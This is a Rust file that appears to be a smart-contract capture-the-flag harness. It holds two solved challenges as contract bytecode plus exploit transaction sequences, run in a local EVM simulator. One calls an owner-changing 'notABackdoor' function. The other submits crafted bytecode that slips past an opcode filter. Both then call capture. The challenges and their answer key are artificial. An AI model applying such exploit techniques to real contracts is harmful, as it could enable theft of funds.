use anyhow::Error;
use ethers_core::{
    abi::{parse_abi, Token},
    types::H160,
};
use revm::primitives::{
    alloy_primitives::U160, hex::FromHex, Address, Bytecode, Bytes, HashMap, HashSet, TransactTo,
    U256,
};

use crate::{
    db::BlockConfig,
    types::{Account, Environment, Secret, TargetCondition, Transaction, TxSim},
};

pub fn totally_not_a_backdoor() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment {
            block_config: BlockConfig::default(),
            allowed_accounts: HashSet::from_iter([allowed_account]),
            accounts: HashMap::from_iter([
                (allowed_account, Account::new(U256::ZERO, None)),
                (
                    target_contract,
                    Account::new(U256::ZERO, Some(Bytecode::new_raw(Bytes::from_hex("0x608060405234801561001057600080fd5b50600436106100625760003560e01c806327d4e59b146100675780636cbb3b5c1461007c5780638456cb59146100ac578063893d20e8146100d0578063a6f9dae1146100e1578063d4a3e9d7146100f4575b600080fd5b61007a61007536600461028c565b6100fc565b005b60015461008f906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b6000546100c090600160a01b900460ff1681565b60405190151581526020016100a3565b6000546001600160a01b031661008f565b61007a6100ef36600461028c565b610172565b61007a6101cc565b600054600160a01b900460ff16156101505760405162461bcd60e51b815260206004820152601260248201527110dbdb9d1c9858dd081a5cc81c185d5cd95960721b60448201526064015b60405180910390fd5b600080546001600160a01b0319166001600160a01b0392909216919091179055565b6000546001600160a01b031633146100fc5760405162461bcd60e51b815260206004820152601b60248201527f4f6e6c79206f776e65722063616e206368616e6765206f776e657200000000006044820152606401610147565b306001600160a01b031663893d20e86040518163ffffffff1660e01b8152600401602060405180830381865afa15801561020a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061022e91906102b0565b6001600160a01b031661dead6001600160a01b031614610272576040517f63615589523f572b4bad8ebb05080156cf59cceb5f5c34ed89d054f2427f595f90600090a15b565b6001600160a01b038116811461028957600080fd5b50565b60006020828403121561029e57600080fd5b81356102a981610274565b9392505050565b6000602082840312156102c257600080fd5b81516102a98161027456fea2646970667358221220bc7e5c8c851725c71faa7373b0fe820009fef824246d1ffd2f13a71b577dee4764736f6c63430008110033").unwrap()))),
                ),
            ]),
            storage: HashMap::new(),
            target_condition: TargetCondition::new_captured(target_contract),
        };
    println!("Env: {}", env);

    let abi = parse_abi(&["function notABackdoor(address)", "function capture()"])?;
    let txs =
        vec![
            TxSim::AdvanceBlock,
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("notABackdoor")?.encode_input(&[
                    Token::Address(H160::from_slice(allowed_account.as_slice())),
                ])?),
                nonce: 0,
            }),
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("capture")?.encode_input(&[])?),
                nonce: 1,
            }),
        ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

pub fn sourcecode() -> Result<Secret, Error> {
    let allowed_account = Address::from(U160::from(16));
    let target_contract = Address::from(U160::from(17));
    let env = Environment {
            block_config: BlockConfig::default(),
            allowed_accounts: HashSet::from_iter([allowed_account]),
            accounts: HashMap::from_iter([
                (allowed_account, Account::new(U256::ZERO, None)),
                (
                    target_contract,
                    Account::new(U256::ZERO, Some(Bytecode::new_raw(Bytes::from_hex("0x608060405234801561001057600080fd5b50600436106100415760003560e01c806328f481dc146100465780636a276f9d1461005b578063d4a3e9d71461007c575b600080fd5b610059610054366004610261565b610084565b005b6000546100689060ff1681565b604051901515815260200160405180910390f35b6100596100e1565b600061008f82610118565b9050806100d05760405162461bcd60e51b815260206004820152600b60248201526a556e7361666520636f646560a81b604482015260640160405180910390fd5b50506000805460ff19166001179055565b60005460ff1615610116576040517f63615589523f572b4bad8ebb05080156cf59cceb5f5c34ed89d054f2427f595f90600090a15b565b6000805b825181101561024257600083828151811061013957610139610312565b016020015160f81c905060308110801590610158575060488160ff1611155b15610167575060009392505050565b8060ff166054148061017c57508060ff166055145b8061018a57508060ff1660f0145b8061019857508060ff1660f1145b806101a657508060ff1660f2145b806101b457508060ff1660f4145b806101c257508060ff1660f5145b806101d057508060ff1660fa145b806101de57508060ff1660ff145b156101ed575060009392505050565b60608160ff1610158015610204575060808160ff16105b1561022f5761021460608261033e565b61021f90600161035d565b61022c9060ff1683610376565b91505b8161023981610389565b9250505061011c565b50600192915050565b634e487b7160e01b600052604160045260246000fd5b60006020828403121561027357600080fd5b813567ffffffffffffffff8082111561028b57600080fd5b818401915084601f83011261029f57600080fd5b8135818111156102b1576102b161024b565b604051601f8201601f19908116603f011681019083821181831017156102d9576102d961024b565b816040528281528760208487010111156102f257600080fd5b826020860160208301376000928101602001929092525095945050505050565b634e487b7160e01b600052603260045260246000fd5b634e487b7160e01b600052601160045260246000fd5b60ff828116828216039081111561035757610357610328565b92915050565b60ff818116838216019081111561035757610357610328565b8082018082111561035757610357610328565b60006001820161039b5761039b610328565b506001019056fea26469706673582212208773d1f77fe101c5d14186a62fd61815afa42d74a6d259ef2a8ecd37f112324464736f6c63430008110033").unwrap()))),
                ),
            ]),
            storage: HashMap::new(),
            target_condition: TargetCondition::new_captured(target_contract),
        };
    println!("Env: {}", env);

    let abi = parse_abi(&["function submitCode(bytes)", "function capture()"])?;
    let txs = vec![
            TxSim::AdvanceBlock,
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("submitCode")?.encode_input(&[Token::Bytes(
                    ethers_core::abi::Bytes::from_hex("0x7f806cffffffffffffffffffffffffff50600152602152607f60005360416000f3806cffffffffffffffffffffffffff50600152602152607f60005360416000f3").unwrap(),
                )])?),
                nonce: 0,
            }),
            TxSim::Transaction(Transaction {
                caller: allowed_account,
                transact_to: TransactTo::Call(target_contract),
                value: U256::ZERO,
                data: Bytes::from(abi.function("capture")?.encode_input(&[])?),
                nonce: 1,
            }),
        ];

    Ok(Secret {
        submitter: H160::from_slice(allowed_account.as_slice()),
        txs,
        enviroment: env,
    })
}

#[cfg(test)]
mod tests {
    use crate::{secrets::totally_not_a_backdoor, transact};

    #[test]
    fn test_totally_not_a_backdoor() {
        let secret = totally_not_a_backdoor().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }

    #[test]
    fn test_sourcecode() {
        let secret = crate::secrets::sourcecode().expect("Should contruct secret");
        let _result = transact(secret).expect("Should not revert");
    }
}
